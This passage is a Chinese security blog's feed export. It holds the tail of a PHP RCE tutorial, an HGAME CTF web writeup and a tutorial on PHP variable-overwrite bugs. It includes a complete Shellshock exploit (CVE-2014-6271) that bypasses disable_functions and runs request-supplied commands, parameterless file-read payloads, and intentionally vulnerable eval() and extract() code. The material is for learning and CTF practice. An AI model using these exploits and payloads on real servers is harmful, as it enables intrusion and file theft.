delimiter">&lt;?php</span> <span class="token shell-comment comment"># Exploit Title: PHP 5.x Shellshock Exploit (bypass disable_functions) </span><span class="token shell-comment comment"># Google Dork: none </span><span class="token shell-comment comment"># Date: 10/31/2014 </span><span class="token shell-comment comment"># Exploit Author: Ryan King (Starfall) </span><span class="token shell-comment comment"># Vendor Homepage: http:</span><span class="token comment" spellcheck="true">//php.net </span><span class="token shell-comment comment"># Software Link: http:</span><span class="token comment" spellcheck="true">//php.net/get/php-5.6.2.tar.bz2/from/a/mirror </span><span class="token shell-comment comment"># Version: 5.* (tested on 5.6.2) </span><span class="token shell-comment comment"># Tested on: Debian 7 and CentOS 5 and 6 </span><span class="token shell-comment comment"># CVE: CVE-2014-6271 </span><span class="token keyword">function</span> <span class="token function">shellshock</span><span class="token punctuation">(</span><span class="token variable">$cmd</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token comment" spellcheck="true">// Execute a command via CVE-2014-6271 @mail.c:283 </span>   <span class="token variable">$tmp</span> <span class="token operator">=</span> <span class="token function">tempnam</span><span class="token punctuation">(</span><span class="token string">"."</span><span class="token punctuation">,</span><span class="token string">"data"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">putenv</span><span class="token punctuation">(</span><span class="token string">"PHP_LOL=() { x; }; $cmd >$tmp 2>&amp;1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// In Safe Mode, the user may only alter environment variableswhose names </span>   <span class="token comment" spellcheck="true">// begin with the prefixes supplied by this directive. </span>   <span class="token comment" spellcheck="true">// By default, users will only be able to set environment variablesthat </span>   <span class="token comment" spellcheck="true">// begin with PHP_ (e.g. PHP_FOO=BAR). Note: if this directive isempty, </span>   <span class="token comment" spellcheck="true">// PHP will let the user modify ANY environment variable! </span>   <span class="token function">mail</span><span class="token punctuation">(</span><span class="token string">"a@127.0.0.1"</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">,</span><span class="token string">"-bv"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// -bv so we don't actuallysend any mail </span>   <span class="token variable">$output</span> <span class="token operator">=</span> @<span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$tmp</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    @<span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$tmp</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$output</span> <span class="token operator">!=</span> <span class="token string">""</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token variable">$output</span><span class="token punctuation">;</span>    <span class="token keyword">else</span> <span class="token keyword">return</span> <span class="token string">"No output, or not vuln."</span><span class="token punctuation">;</span> <span class="token punctuation">}</span> <span class="token keyword">echo</span> <span class="token function">shellshock</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string">"cmd"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token delimiter">?></span></code></pre><h2 id="08-无参数命令执行"><a href="#08-无参数命令执行" class="headerlink" title="08)无参数命令执行"></a>08)无参数命令执行</h2><p>主要思路: 函数套用即<code>a(b());</code>这种形式,而在正则表达式中与之对应的就是<code>\((?R)?\)</code></p><p>还是先来总结一下相关的函数把.读取目录用<code>scandir()</code>函数就行了,这个函数的返回值是以<code>数组形式</code>返回的,因此在读取相关的文件时候,可以使用<strong>数组指针的形式进行指向需要读取的文件</strong></p><p>关于PHP数组</p><blockquote><p>PHP 中的数组实际上是一个有序映射。映射是一种把 <em>values</em>   关联到 <em>keys</em> 的类型。此类型在很多方面做了优化，因此可以把它当成真正的数组，或列表（向量），散列表（是映射的一种实现），字典，集合，栈，队列以及更多可能性。由于数组元素的值也可以是另一个数组，树形结构和多维数组也是允许的。 </p></blockquote><p><img src="https://i.loli.net/2020/01/23/o1YUclwqrthSnH9.png" alt></p><p>php中数组指向函数</p><p><img src="http://static.zybuluo.com/Pdsdt/bnn1qg7n9l8b3bw0vzv85zxb/image.png" alt></p><p>绕过<code>.</code> , <code>.</code>达到读取上层目录文件的目的</p><p><img src="http://static.zybuluo.com/Pdsdt/idhz48o1god8sbslcnliadwp/image.png" alt></p><p><img src="http://static.zybuluo.com/Pdsdt/dxuwv4t48eqwt7ysodnufye5/image.png" alt></p><p>这里<code>localeconv()</code>返回的第一个元素正好就是<code>.</code>,因此可以构造读取当前文件夹后的最后一个文件</p><pre><code>readfile(end(scandir(reset(localeconv()))));</code></pre><p>其他方法</p><pre><code>chr(ceil(sinh(cosh(tan(floor(sqrt(floor(phpversion())))))))) #46chrchr(pos(localtime(time(chdir(next(scandir(pos(localeconv())))))))) #46</code></pre><p>如果文件在上一个目录.使用<code>chdir()</code>函数,但是这个函数返回结果只有0和1,故需要构造判断语句</p><p><img src="https://i.loli.net/2020/01/23/a4Vcj9dWOHCAGvD.png" alt></p><pre><code>if(chdir(next(scandir(pos(localeconv())))))readfile(end(scandir(pos(localeconv()))));# 使用chdir()函数，更改目录，返回1的同时，读取目录下的文件</code></pre><pre><code>echo(readfile(end(scandir(chr(pos(localtime(time(chdir(next(scandir(pos(localeconv()))))))))))));# 通过chdir修改当前目录，通过localtime()等函数构造chr（46）即“.”达到读取上层目录文件的目的</code></pre><p>例子1</p><p>字节CTF</p><pre class=" language-PHP"><code class="language-PHP">            $code = file_get_contents($url);            if (';' === preg_replace('/[a-z]+\((?R)?\)/', NULL, $code)) {                if (preg_match('/et|na|nt|strlen|info|path|rand|dec|bin|hex|oct|pi|exp|log/i', $code)) {                    echo 'bye~';                } else {                    eval($code);                }            }        } else {            echo "error: host not allowed";        }    } else {        echo "error: invalid url";    }}else{    highlight_file(__FILE__);}</code></pre><p>官方wp</p><pre><code>echo(readfile(end(scandir(chr(pos(localtime(time(chdir(next(scandir(chr(ceil(sinh(cosh(tan(floor(sqrt(floor(phpversion())))))))))))))))))));# 同样的原理，不过生成chr(46)的方式不同</code></pre><p>2019上海市大学生网络安全大赛_decade</p><pre class=" language-PHP"><code class="language-PHP"><?phphighlight_file(__FILE__);$code = $_GET['code'];if (!empty($code)) {        if (';' === preg_replace('/[a-z]+\((?R)?\)/', NULL, $code)) {        if (preg_match('/readfile|if|time|local|sqrt|et|na|nt|strlen|info|path|rand|dec|bin|hex|oct|pi|exp|log/i', $code)) {            echo 'bye~';                } else {                    eval($code);                }            }        else {            echo "invalid";        }}else {        echo "invalid";    }?></code></pre><p>这里正则过滤了更多东西,过滤了local就不能使用上面的方法来构造<code>.</code>了</p><pre><code>readfile(end(scandir(chr(ceil(sinh(cosh(tan(floor(sqrt(floor(phpversion())))))))))));</code></pre><p>因为<code>sqrt</code> 被过滤</p><pre><code>(ord(hebrevc(crypt(phpversion()))));</code></pre><pre><code>readgzfile(end(scandir(chr(ord(hebrevc(crypt(chdir(next(scandir(chr(ord(hebrevc(crypt(phpversion()))))))))))))));</code></pre><p><strong>主要是对相关函数的功能要熟悉</strong></p><h1 id="0x05-漏洞防御"><a href="#0x05-漏洞防御" class="headerlink" title="0x05  漏洞防御"></a>0x05  漏洞防御</h1><ul><li>升级插件,框架最新版本</li><li>对用户的输入,尤其是一些变量存在的地方就行严格过滤或者禁用一些功能</li><li>谨慎使用危险函数</li></ul><h1 id="0x06-总结"><a href="#0x06-总结" class="headerlink" title="0x06  总结"></a>0x06  总结</h1><p><strong>经常需要对payload中的不可见字符用url编码</strong></p><p>这篇总结是对PHP 的RCE一次总结,然而不光PHP有RCE,还有很多语言也有RCE漏洞,比如JAVA S2 045 这个漏洞影响有多大不用说了吧</p><p><a href="https://xz.aliyun.com/t/4607" target="_blank" rel="noopener">Struts2 历史RCE漏洞 EXP汇总 常用工具流量特征分析</a></p><p><a href="https://lorexxar.cn/2019/09/23/javaweb-S2/" target="_blank" rel="noopener">从零开始学java web - struts2 RCE分析</a></p><p>主要是平时遇见的少,实操就少了.正在尝试给服务器提供一个RCE的环境</p><h1 id="0x06-参考资料"><a href="#0x06-参考资料" class="headerlink" title="0x06  参考资料"></a>0x06  参考资料</h1><p>有一说一,网上关于RCE的基础讲解是真的少?其实是RCE一般比较难挖掘,并且出现也是在多个漏洞一起利用下(可能是大佬觉得没啥讲的,虽然intitle: RCE漏洞有3k+结果…加油吧</p><p>持续总结更新,遇见了就拿过来!</p><p><a href="https://www.freebuf.com/tag/rce%E6%BC%8F%E6%B4%9E" target="_blank" rel="noopener">RCE漏洞专栏-Freebuf</a></p><p><a href="https://www.freebuf.com/tag/%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C" target="_blank" rel="noopener">远程代码执行专栏-Freebuf</a></p><p><a href="https://blog.csdn.net/qq_41453285/article/details/100777421" target="_blank" rel="noopener">Web安全攻防:10—RCE（远程命令执行）漏洞介绍</a></p><p><a href="https://www.cnblogs.com/20175211lyz/p/11396392.html" target="_blank" rel="noopener">https://www.cnblogs.com/20175211lyz/p/11396392.html</a></p><p><a href="https://www.anquanke.com/post/id/87203" target="_blank" rel="noopener">如何绕过四个字符限制getshell</a></p><p><a href="https://www.freebuf.com/articles/web/192052.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/192052.html</a></p><p><a href="https://www.anquanke.com/post/id/175403" target="_blank" rel="noopener">https://www.anquanke.com/post/id/175403</a></p><p><a href="https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD" target="_blank" rel="noopener">https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD</a></p><p><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html" target="_blank" rel="noopener">无字母数字webshell之提高篇</a></p><p><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html" target="_blank" rel="noopener">一些不包含数字和字母的webshell</a></p><p><a href="https://blog.csdn.net/whatday/article/details/100191703" target="_blank" rel="noopener">https://blog.csdn.net/whatday/article/details/100191703</a></p><p><a href="http://drops.xmd5.com/static/drops/tools-3786.html" target="_blank" rel="noopener">http://drops.xmd5.com/static/drops/tools-3786.html</a></p><p><a href="https://evoa.me/index.php/archives/62/" target="_blank" rel="noopener">极客大挑战 RCE ME</a></p><p>绕过disable_function(目前对我来说有点难理解)</p><ul><li><a href="https://www.leavesongs.com/PHP/php-bypass-disable-functions-by-CVE-2014-6271.html" target="_blank" rel="noopener">https://www.leavesongs.com/PHP/php-bypass-disable-functions-by-CVE-2014-6271.html</a></li><li><a href="https://www.freebuf.com/articles/web/192052.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/192052.html</a></li><li><a href="https://www.anquanke.com/post/id/175403" target="_blank" rel="noopener">https://www.anquanke.com/post/id/175403</a></li><li><a href="https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD" target="_blank" rel="noopener">https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD</a></li><li><a href="https://xz.aliyun.com/t/4113" target="_blank" rel="noopener">https://xz.aliyun.com/t/4113</a></li><li><a href="https://mochazz.github.io/2018/09/27/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E7%BB%95%E8%BF%87PHP%E7%9A%84disable_functions/" target="_blank" rel="noopener">https://mochazz.github.io/2018/09/27/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E7%BB%95%E8%BF%87PHP%E7%9A%84disable_functions/</a></li><li><a href="https://blog.csdn.net/qq_17204441/article/details/90704743" target="_blank" rel="noopener">https://blog.csdn.net/qq_17204441/article/details/90704743</a></li><li><a href="https://www.tr0y.wang/2018/04/18/PHPDisalbedfunc/index.html" target="_blank" rel="noopener">https://www.tr0y.wang/2018/04/18/PHPDisalbedfunc/index.html</a></li></ul><p>无参数命令执行</p><p><a href="http://www.pdsdt.lovepdsdt.com/index.php/2019/11/06/php_shell_no_code/#comment-15" target="_blank" rel="noopener">http://www.pdsdt.lovepdsdt.com/index.php/2019/11/06/php_shell_no_code/#comment-15</a></p><p><a href="https://www.php.net/manual/zh/ref.array.php" target="_blank" rel="noopener">https://www.php.net/manual/zh/ref.array.php</a></p><p>​                           <strong><em>“If you can dream it, you can do it.”</em></strong></p>]]></content>
      
      
      <categories>
          
          <category> TOP10基础漏洞 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> RCE </tag>
            
            <tag> webshell </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HGAME CTF Web Writeup(Week 1)</title>
      <link href="/posts/20200115/"/>
      <url>/posts/20200115/</url>
      
        <content type="html"><![CDATA[<h1 id="Cosmos-的博客"><a href="#Cosmos-的博客" class="headerlink" title="Cosmos 的博客"></a>Cosmos 的博客</h1><ul><li>Git源码泄露</li><li>Github常见功能掌握</li></ul><p><img src="https://i.loli.net/2020/01/26/cRjH4SWOFdnQiGN.png" alt></p><p><img src="https://i.loli.net/2020/01/17/CWain4XKMow9mGU.png" alt></p><p>通过相应的泄露了的网站URL;<code>http://cosmos.hgame.n3ko.co/.git/config,</code>我们找到了他的Github的仓库的地址</p><p><img src="https://i.loli.net/2020/01/17/1OjKu6WSxLUAwXT.png" alt></p><p><img src="https://i.loli.net/2020/01/17/xBW73DcYiZRhnCS.png" alt></p><p><img src="https://i.loli.net/2020/01/17/rqS74lKCjBdAvsu.png" alt></p><p>打开题目是这样,圈起来的就是提示.</p><p>base64 解码: aGdhbWV7ZzF0X2xlQGtfMXNfZGFuZ2VyMHVzXyEhISF9</p><p>得到flag</p><h1 id="接-头-霸-王"><a href="#接-头-霸-王" class="headerlink" title="接 头 霸 王"></a>接 头 霸 王</h1><ul><li>常见的HTTP请求伪造</li></ul><p>直接上py,方便的多</p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> jsonurl <span class="token operator">=</span> <span class="token string">'http://kyaru.hgame.n3ko.co/'</span>headers <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'Referer'</span><span class="token punctuation">:</span><span class="token string">'https://vidar.club'</span><span class="token punctuation">,</span><span class="token string">'X-Forwarded-For'</span><span class="token punctuation">:</span><span class="token string">'127.0.0.1'</span><span class="token punctuation">,</span><span class="token string">'User-Agent'</span><span class="token punctuation">:</span><span class="token string">'Cosmos'</span><span class="token punctuation">,</span><span class="token string">'If-Unmodified-Since'</span><span class="token punctuation">:</span><span class="token string">'Fri, 01 Jan 2078 00:00:00 GMT'</span><span class="token punctuation">}</span>r<span class="token operator">=</span>requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span>headers<span class="token operator">=</span>headers<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>text<span class="token punctuation">)</span></code></pre><p><img src="https://i.loli.net/2020/01/17/FcVqPw3Lvd4uJQb.png" alt></p><p>关于一个知识点,我都快忘了</p><blockquote><p><strong><code>If-Modified-Since</code></strong> 是一个条件式请求首部，服务器只在所请求的资源在给定的日期时间之后对内容进行过修改的情况下才会将资源返回，状态码为 <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Status/200" target="_blank" rel="noopener"><code>200</code></a>  。如果请求的资源从那时起未经修改，那么返回一个不带有消息主体的 <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Status/304" target="_blank" rel="noopener"><code>304</code></a>  响应，而在 <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Last-Modified" target="_blank" rel="noopener"><code>Last-Modified</code></a> 首部中会带有上次修改时间。 不同于  <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/If-Unmodified-Since" target="_blank" rel="noopener"><code>If-Unmodified-Since</code></a>, <code>If-Modified-Since</code> 只可以用在 <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Methods/GET" target="_blank" rel="noopener"><code>GET</code></a> 或 <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Methods/HEAD" target="_blank" rel="noopener"><code>HEAD</code></a> 请求中。</p><p>当与 <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/If-None-Match" target="_blank" rel="noopener"><code>If-None-Match</code></a> 一同出现时，它（<strong><code>If-Modified-Since</code></strong>）会被忽略掉，除非服务器不支持 <code>If-None-Match</code>。</p><p>最常见的应用场景是来更新没有特定 <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/ETag" target="_blank" rel="noopener"><code>ETag</code></a> 标签的缓存实体。</p><p>HTTP协议中的 <strong><code>If-Unmodified-Since</code></strong> 消息头用于请求之中，使得当前请求成为条件式请求：只有当资源在指定的时间之后没有进行过修改的情况下，服务器才会返回请求的资源，或是接受 <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Methods/POST" target="_blank" rel="noopener"><code>POST</code></a> 或其他 non-<a href="https://developer.mozilla.org/en-US/docs/Glossary/safe" target="_blank" rel="noopener">safe</a> 方法的请求。如果所请求的资源在指定的时间之后发生了修改，那么会返回 <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Status/412" target="_blank" rel="noopener"><code>412</code></a> (Precondition Failed) 错误。</p><p>常见的应用场景有两种：</p><ul><li>与 non-<a href="https://developer.mozilla.org/en-US/docs/Glossary/safe" target="_blank" rel="noopener">safe</a> 方法如 <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Methods/POST" target="_blank" rel="noopener"><code>POST</code></a> 搭配使用，可以用来<a href="https://en.wikipedia.org/wiki/Optimistic_concurrency_control" target="_blank" rel="noopener">优化并发控制</a>，例如在某些wiki应用中的做法：假如在原始副本获取之后，服务器上所存储的文档已经被修改，那么对其作出的编辑会被拒绝提交。</li><li>与含有 <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/If-Range" target="_blank" rel="noopener"><code>If-Range</code></a> 消息头的范围请求搭配使用，用来确保新的请求片段来自于未经修改的文档。</li></ul></blockquote><h1 id="Code-World"><a href="#Code-World" class="headerlink" title="Code World"></a>Code World</h1><p>我也不知道我做这道题的方法是不是题目的预期</p><ul><li><p>HTTP请求方法修改</p></li><li><p>URL编码知识</p><p>首先是解决重定向的问题. 我们直接在题目栏就开始抓包,即抓到最原始的包,</p><p>然后修改GET请求为POST请求,就会看到人鸡验证,然后我在bp里面提交参数没什么反应,于是拉到postman中进行提交</p></li></ul><p><img src="https://i.loli.net/2020/01/17/hD7P5gpruoqEI3X.png" alt></p><p><img src="https://i.loli.net/2020/01/17/yruniczjWQXFI7E.png" alt></p><p>这里注意要对+号进行URL编码,因为在URL里面+可以被当做空格处理</p><h1 id="尼泰玫"><a href="#尼泰玫" class="headerlink" title="尼泰玫"></a>尼泰玫</h1><ul><li>套路题,抓包修改得分得flag</li><li>或者改前端的JS</li></ul><p><img src="https://i.loli.net/2020/01/17/vGuOCdjXJL3hRmz.png" alt></p><p>希望后面能有更多有意思的题目,学到更多的东西</p>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>一篇文章深入学习变量覆盖漏洞</title>
      <link href="/posts/20200114/"/>
      <url>/posts/20200114/</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00  前言"></a>0x00  前言</h1><p>昨天发的文件包含漏洞和今天的变量覆盖漏洞其实都是属于PHP安全问题的范畴,当然关于<strong>PHP安全的问题</strong>还有很多,比如后面会总结的<strong>代码执行漏洞</strong>这些</p><a id="more"></a><p>这个漏洞感觉现在只会在CTF题目中出现,因为防御这个漏洞的方法比较简单</p><blockquote><p>本学习笔记,大量参考自网络上各位大佬总结好的,再加上自己的心得总结而成,用途仅用于安全技术学习.文末注明参考资料,侵删.</p></blockquote><h1 id="0x01-基础知识"><a href="#0x01-基础知识" class="headerlink" title="0x01  基础知识"></a>0x01  基础知识</h1><p>既然是PHP安全问题,那么就肯定和php的一些函数有关,下面来看看学习这些函数</p><p><strong>全局变量</strong></p><p><img src="https://i.loli.net/2020/01/13/FIRkl1cOqWTUXKH.png" alt></p><p>最常用的就是$GLOBALS</p><p>作用是引用全局作用域中可用的全部变量</p><p>说明:  一个包含了全部变量的全局组合数组。变量的名字就是数组的键。  </p><p><strong>extract()</strong></p><p><a href="https://www.runoob.com/php/func-array-extract.html" target="_blank" rel="noopener">https://www.runoob.com/php/func-array-extract.html</a></p><p>定义: </p><p>extract() 函数从数组中将变量导入到当前的符号表。</p><p><strong>该函数使用数组键名作为变量名，使用数组键值作为变量值。</strong>针对数组中的每个元素，将在当前符号表中创建对应的一个变量。</p><p>该函数返回成功设置的变量数目。</p><p>语法: </p><pre><code>extract(*array,extract_rules,prefix*)</code></pre><table><thead><tr><th>参数</th><th>描述</th></tr></thead><tbody><tr><td><em>array</em></td><td>必需。规定要使用的数组。</td></tr><tr><td><em>extract_rules</em></td><td>可选。extract() 函数将检查每个键名是否为合法的变量名，同时也检查和符号表中已存在的变量名是否冲突。对不合法和冲突的键名的处理将根据此参数决定。可能的值：  <strong>EXTR_OVERWRITE - 默认。如果有冲突，则覆盖已有的变量。</strong>     <strong>EXTR_SKIP - 如果有冲突，不覆盖已有的变量。</strong>     EXTR_PREFIX_SAME - 如果有冲突，在变量名前加上前缀 prefix。     EXTR_PREFIX_ALL - 给所有变量名加上前缀 prefix。     EXTR_PREFIX_INVALID - 仅在不合法或数字变量名前加上前缀 prefix。     EXTR_IF_EXISTS - 仅在当前符号表中已有同名变量时，覆盖它们的值。其它的都不处理。     EXTR_PREFIX_IF_EXISTS - 仅在当前符号表中已有同名变量时，建立附加了前缀的变量名，其它的都不处理。     EXTR_REFS - 将变量作为引用提取。导入的变量仍然引用了数组参数的值。</td></tr><tr><td><em>prefix</em></td><td>可选。如果 extract_rules 参数的值是 EXTR_PREFIX_SAME、EXTR_PREFIX_ALL、 EXTR_PREFIX_INVALID 或 EXTR_PREFIX_IF_EXISTS，则 prefix 是必需的。      该参数规定了前缀。前缀和数组键名之间会自动加上一个下划线。</td></tr></tbody></table><p><strong>parse_str()</strong></p><p>官方解释为: 将字符串解析成<strong>多个</strong>变量,该函数没有返回值</p><p><img src="https://i.loli.net/2020/01/13/7f3qQS8PgvGAulF.png" alt></p><p>parse_str() 函数把查询字符串解析到变量中。</p><p><strong>注释：</strong>如果未设置 array 参数，由该函数设置的变量将覆盖已存在的同名变量。</p><p><strong>注释：</strong>php.ini 文件中的 magic_quotes_gpc 设置影响该函数的输出。如果已启用，那么在 parse_str() 解析之前，变量会被 addslashes() 转换。</p><p><strong>import_request_variables()</strong></p><p><img src="https://i.loli.net/2020/01/13/JOeIi156skadBEP.png" alt></p><p>其中第二个参数是为导入的变量添加的前缀,如果没有指定,则将覆盖全局变量</p><p><strong>可变变量$$</strong></p><p><img src="https://i.loli.net/2020/01/13/WxKihSDQA6X9q5j.png" alt></p><h1 id="0x02-变量覆盖漏洞"><a href="#0x02-变量覆盖漏洞" class="headerlink" title="0x02 变量覆盖漏洞"></a>0x02 变量覆盖漏洞</h1><p>变量覆盖指的是可以用我们自定义的参数值替换程序原有的变量值，变量覆盖漏洞通常需要结合程序的其他功能来实现完整攻击。<br>变量覆盖漏洞大多由函数使用不当导致，经常引发变量覆盖的漏洞有：extract()函数和parse_str()<br>函数，<strong>import_request_variables()函数则是用在没有开启全局变量注册的时候，调用了这个函数则相当于开启了全局变量注册</strong>。另外部分应用利用$$的方式注册变量没验证已有变量导致覆盖。</p><p><code>register_globals</code>的意思是注册为全局变量,如果为on的时候,传递过来的值会被直接注册为全局变量直接使用</p><h2 id="全局变量覆盖"><a href="#全局变量覆盖" class="headerlink" title="全局变量覆盖"></a>全局变量覆盖</h2><p>代码示例1:  </p><pre class=" language-PHP"><code class="language-PHP"><?php  //?id=1echo "Register_globals: ".(int)ini_get("register_globals")."<br/>"; echo '$_GET["id"] :'.$_GET['id']."<br/>";echo '$id :'.$id;?></code></pre><p>当register_globals=Off的时候，下一个程序接收的时候应该用$_GET[‘id’]来接受传递过来的值；</p><p>当register_globals=On的时候，下一个程序可以直接使用$id来接受值,也可以用$_GET[‘id’]来接受传递过来的值。</p><p>tips：如果上面的代码中，已经对变量$id赋了初始值，比如$id=0，那么即使在URL中有/test.php?id=1，也不会将变量覆盖，id值为0</p><p><img src="https://i.loli.net/2020/01/13/cxpTSbh3BCqQEyW.png" alt></p><p>代码示例2: </p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>  <span class="token keyword">echo</span> <span class="token string">"Register_globals: "</span><span class="token punctuation">.</span><span class="token punctuation">(</span>int<span class="token punctuation">)</span><span class="token function">ini_get</span><span class="token punctuation">(</span><span class="token string">"register_globals"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">"&lt;br/>"</span><span class="token punctuation">;</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">ini_get</span><span class="token punctuation">(</span><span class="token string">'register_globals'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span> <span class="token keyword">as</span> <span class="token variable">$k</span><span class="token operator">=</span><span class="token operator">></span><span class="token variable">$v</span><span class="token punctuation">)</span> <span class="token function">unset</span><span class="token punctuation">(</span>$<span class="token punctuation">{</span><span class="token variable">$k</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">print</span> <span class="token variable">$a</span><span class="token punctuation">.</span><span class="token string">"&lt;br/>"</span><span class="token punctuation">;</span>  <span class="token keyword">print</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span>b<span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token delimiter">?></span></code></pre><p>因为变量a未初始化,提交?a=123&amp;b=456只回显456</p><p>当提交?GLOBALS[a]=123&amp;b=456时  都有回显</p><p>GLOBALS[a]用于覆盖</p><blockquote><p> PHP » 4.2.0 版开始配置文件中 PHP 指令 register_globals 的默认值从 on 改为 off 了,自 PHP 5.3.0 起废弃并将自 PHP 5.4.0 起移除。</p></blockquote><h2 id="extract-变量覆盖"><a href="#extract-变量覆盖" class="headerlink" title="extract()变量覆盖"></a>extract()变量覆盖</h2><p>代码示例: </p><pre class=" language-PHP"><code class="language-PHP"><?php    $auth = '0';    extract($_GET);if ($auth == 1) {    echo "private!";}else {    echo "pubilc";}?></code></pre><p><a href="http://127.0.0.1/CTF/blfg.php?auth=1" target="_blank" rel="noopener">http://127.0.0.1/CTF/blfg.php?auth=1</a> 即可绕过服务器端逻辑</p><h2 id="parse-str-变量覆盖"><a href="#parse-str-变量覆盖" class="headerlink" title="parse_str()变量覆盖"></a>parse_str()变量覆盖</h2><p>parse_str() 函数把查询字符串解析到变量中，如果没有array 参数，则由该函数设置的变量将覆盖已存在的同名变量。</p><pre class=" language-PHP"><code class="language-PHP"><?phpparse_str("a=1");echo $a."<br/>";      //$a=1parse_str("b=1&c=2",$myArray);print_r($myArray);   //Array ( [c] => 1 [b] => 2 ) ?></code></pre><p>tips：</p><p>parse_str()类似的函数还有mb_parse_str()，用法基本一致。</p><h2 id="import-request-variables变量覆盖"><a href="#import-request-variables变量覆盖" class="headerlink" title="import_request_variables变量覆盖"></a>import_request_variables变量覆盖</h2><p>覆盖原理其实基础知识里面也写了</p><p>import_request_variables 函数可以在 register_global = off 时，把 GET/POST/Cookie 变量导入全局作用域中。</p><pre class=" language-PHP"><code class="language-PHP"><?phpimport_request_variables("g", "get_");echo $get_id;?>//提交：?id=111//结构：111</code></pre><h2 id="遍历初始化变量"><a href="#遍历初始化变量" class="headerlink" title="遍历初始化变量"></a>遍历初始化变量</h2><p>使用foreach来遍历数组中的值，然后再将获取到的数组键名作为变量，数组中的键值作为变量的值。因此就产生了变量覆盖漏洞。</p><p>代码示例:  </p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$_GET</span> <span class="token keyword">as</span> <span class="token variable">$key</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$value</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>$<span class="token punctuation">{</span><span class="token variable">$key</span><span class="token punctuation">}</span> <span class="token operator">=</span> <span class="token variable">$value</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">echo</span> <span class="token variable">$a</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><h1 id="0x03-漏洞防御"><a href="#0x03-漏洞防御" class="headerlink" title="0x03  漏洞防御"></a>0x03  漏洞防御</h1><ol><li>确保register_globals=OFF</li><li>如果不能自定义php.ini,那么应该在代码中严格控制</li><li>熟悉造成变量覆盖的函数和方法,检查用户是否能控制变量的来源</li><li>养成初始化变量的好习惯</li></ol><h1 id="0x04-漏洞挖掘"><a href="#0x04-漏洞挖掘" class="headerlink" title="0x04  漏洞挖掘"></a>0x04  漏洞挖掘</h1><p>由于变量覆盖漏洞通常要结合应用其他功能代码来实现完整攻击，所以挖掘一个可用的变量覆盖漏洞不仅仅要考虑的是能够实现变量覆盖，还要考虑后面的代码能不能让这个漏洞利用起来。<br>由函数导致的变量覆盖比较好挖掘，只要<strong>搜寻参数带有变量的extract()、parse_str()函数，然后去回溯变量是否可控。关于我们说过的使用双$符号注册变量会导致变量覆盖，我们可以通过搜“$$”这个关键字去挖掘。</strong></p><h1 id="0x05-总结"><a href="#0x05-总结" class="headerlink" title="0x05  总结"></a>0x05  